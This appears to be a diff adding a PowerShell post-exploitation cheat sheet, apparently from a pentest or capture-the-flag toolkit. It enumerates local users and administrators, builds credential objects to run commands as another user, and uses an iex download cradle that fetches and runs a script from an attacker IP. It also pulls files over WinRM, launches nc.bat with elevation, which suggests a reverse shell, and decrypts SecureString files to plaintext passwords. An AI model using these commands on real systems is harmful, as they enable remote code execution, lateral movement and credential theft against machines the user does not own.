@@ -1,0 +1,41 @@
+--- Users
+
+Get-LocalUser | ft Name,Enabled,Description,LastLogon
+
+Get-ChildItem C:\Users -Force | select Name
+
+--- Groups 
+
+# desc: All groups
+Get-LocalGroup | ft Name 
+
+# desc: Members of Administrators
+Get-LocalGroupMember Administrators | ft Name, PrincipalSource 
+
+--- SUDO
+
+# desc: CREATE A CREDENTIAL OBJECT
+$pass = ConvertTo-SecureString '#{PWD}' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("#{USER}", $pass)
+
+# desc: For local:
+Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"
+
+# desc: For WINRM
+# CHECK WORKING
+# (expected: username of the credentials user)
+Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
+
+# desc: DOWNLOAD
+Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri #{LHOST}:#{LPORT}/#{file} -outfile #{dest_file} } -credential $cred
+
+Start-Process powershell -Credential $cred -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'
+
+--- Password from SecureString
+
+$pw=gc #{file} | convertto-securestring 
+#Get the securestring from the file
+$cred=new-object system.management.automation.pscredential("administrator", $pw)
+$cred.getnetworkcredential() | fl * 
+#Get plaintext password
+@file.desc(SecureString File)
